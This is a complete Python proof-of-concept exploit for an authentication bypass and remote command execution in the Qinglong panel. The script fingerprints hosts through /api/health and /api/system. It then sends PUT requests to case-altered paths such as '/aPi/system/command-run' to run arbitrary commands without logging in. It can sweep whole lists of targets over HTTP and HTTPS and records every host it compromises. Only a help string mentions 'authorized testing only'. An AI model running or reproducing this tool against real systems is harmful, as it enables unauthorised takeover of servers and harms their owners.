import argparse
import json
import sys
from typing import Optional
from urllib.parse import urlparse

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_HEADERS = {
    "User-Agent": "Qinglong-Security-PoC/1.0",
    "Content-Type": "application/json",
}

_RESET  = "\033[0m"
_COLORS = {
    "[+]": "\033[32m",  # green
    "[-]": "\033[31m",  # red
    "[!]": "\033[33m",  # yellow
    "[*]": "\033[36m",  # cyan
}


def _colorize(msg: str, stream) -> str:
    if not hasattr(stream, "isatty") or not stream.isatty():
        return msg
    for prefix, color in _COLORS.items():
        if prefix in msg:
            return msg.replace(prefix, f"{color}{prefix}{_RESET}", 1)
    return msg


def expand_target(target: str) -> list[str]:
    target = target.strip()
    if not target:
        raise ValueError("empty target")

    if target.startswith(("http://", "https://")):
        parsed = urlparse(target)
        if not parsed.netloc:
            raise ValueError(f"invalid target: {target}")
        return [target.rstrip("/")]

    # No scheme provided: try both
    return [f"http://{target}", f"https://{target}"]


def log(msg: str, json_mode: bool) -> None:
    out = sys.stderr if json_mode else sys.stdout
    print(_colorize(msg, out), file=out)


def req(session: requests.Session, method: str, url: str, timeout, **kwargs) -> Optional[requests.Response]:
    try:
        return session.request(method, url, timeout=timeout, verify=False, **kwargs)
    except requests.exceptions.Timeout:
        print(f"[!] Timeout: {url}", file=sys.stderr)
        return None
    except requests.RequestException:
        return None


def fingerprint(session: requests.Session, base_url: str, timeout, json_mode: bool) -> tuple[bool, str]:
    """Returns (is_qinglong, version)."""
    health = req(session, "GET", f"{base_url}/api/health", timeout)
    if not health or health.status_code != 200:
        log("[-] Target not reachable or not Qinglong (/api/health)", json_mode)
        return False, ""

    system = req(session, "GET", f"{base_url}/api/system", timeout)
    if not system or system.status_code != 200:
        log("[-] /api/system unavailable", json_mode)
        return False, ""

    try:
        version = system.json().get("data", {}).get("version", "unknown")
    except ValueError:
        version = "unknown"

    log(f"[+] Qinglong detected (version: {version})", json_mode)
    return True, version


def exploit_rce(session: requests.Session, base_url: str, command: str, timeout, json_mode: bool) -> dict:
    bypass_paths = [
        "/aPi/system/command-run",
        "/API/system/command-run",
        "/ApI/system/command-run",
    ]

    for path in bypass_paths:
        response = req(
            session,
            "PUT",
            f"{base_url}{path}",
            timeout,
            json={"command": command},
            headers=DEFAULT_HEADERS,
        )

        if not response:
            continue

        if response.status_code == 200:
            log(f"[+] RCE success via {path}", json_mode)
            log(response.text, json_mode)
            return {"success": True, "path": path, "output": response.text}

        log(f"[!] RCE failed via {path} (HTTP {response.status_code})", json_mode)

    return {"success": False, "path": None, "output": None}


def run_target(base_url: str, args: argparse.Namespace, json_mode: bool) -> dict:
    result: dict = {
        "target": base_url,
        "reachable": False,
        "version": None,
        "rce": None,
    }

    log(f"\n[*] Target: {base_url}", json_mode)

    session = requests.Session()
    session.headers.update({"User-Agent": DEFAULT_HEADERS["User-Agent"]})

    timeout = (args.connect_timeout, args.timeout)

    is_qinglong, version = fingerprint(session, base_url, timeout, json_mode)
    if not is_qinglong:
        return result

    result["reachable"] = True
    result["version"] = version

    log("", json_mode)

    result["rce"] = exploit_rce(session, base_url, args.command, timeout, json_mode)

    return result


def load_targets(args: argparse.Namespace) -> list[str]:
    raw = []

    if args.target:
        raw.append(args.target)

    if args.list:
        try:
            with open(args.list) as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith("#"):
                        raw.append(line)
        except OSError as exc:
            print(f"[-] Cannot read target list: {exc}", file=sys.stderr)
            sys.exit(2)

    return raw


def probe_and_run(raw: str, args: argparse.Namespace, json_mode: bool) -> dict:
    """Try HTTP first; only fall back to HTTPS if HTTP is unreachable."""
    try:
        urls = expand_target(raw)
    except ValueError as exc:
        print(f"[-] Skipping invalid target '{raw}': {exc}", file=sys.stderr)
        return {"target": raw, "reachable": False, "version": None, "rce": None}

    result = {"target": raw, "reachable": False, "version": None, "rce": None}
    for url in urls:
        result = run_target(url, args, json_mode)
        if result["reachable"]:
            return result

    return result


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="Qinglong auth-bypass/RCE PoC (authorized testing only)",
    )

    target_group = parser.add_argument_group("targets (at least one required)")
    target_group.add_argument("-t", "--target", help="Single target URL or host:port")
    target_group.add_argument("-l", "--list", metavar="FILE", help="File with one IP:PORT per line (# for comments)")

    parser.add_argument("--timeout", type=int, default=10, help="Read timeout in seconds (default: 10)")
    parser.add_argument("--connect-timeout", type=int, default=5, help="TCP connect timeout in seconds (default: 5)")
    parser.add_argument("--json", dest="json_output", action="store_true", help="Output results as JSON on stdout (logs go to stderr)")
    parser.add_argument("-o", "--output", metavar="FILE", help="Save JSON results to file")

    parser.add_argument("-c", "--command", help="Run command using auth-bypass RCE (example: 'echo qinglong_poc')")

    return parser


def main() -> int:
    parser = build_parser()
    args = parser.parse_args()

    if not args.target and not args.list:
        print("[-] Provide at least one target with -t or -l", file=sys.stderr)
        parser.print_help()
        return 2

    if not args.command:
        print("[!] No action selected. Use -c to run a command via RCE.", file=sys.stderr)
        parser.print_help()
        return 1

    raw_targets = load_targets(args)

    if not raw_targets:
        print("[-] No valid targets.", file=sys.stderr)
        return 2

    results = []
    successful = []
    for raw in raw_targets:
        result = probe_and_run(raw, args, args.json_output)
        results.append(result)

        if result["reachable"] and result["rce"] and result["rce"].get("success"):
            successful.append(result)
            if args.output:
                try:
                    with open(args.output, "w", encoding="utf-8") as f:
                        json.dump(successful, f, indent=2, ensure_ascii=False)
                    log(f"[*] {len(successful)} exploited target(s) saved to {args.output}", args.json_output)
                except OSError as exc:
                    print(f"[-] Cannot write output file: {exc}", file=sys.stderr)

    if args.json_output:
        print(json.dumps(results, indent=2, ensure_ascii=False))

    return 0 if successful else 1


if __name__ == "__main__":
    sys.exit(main())
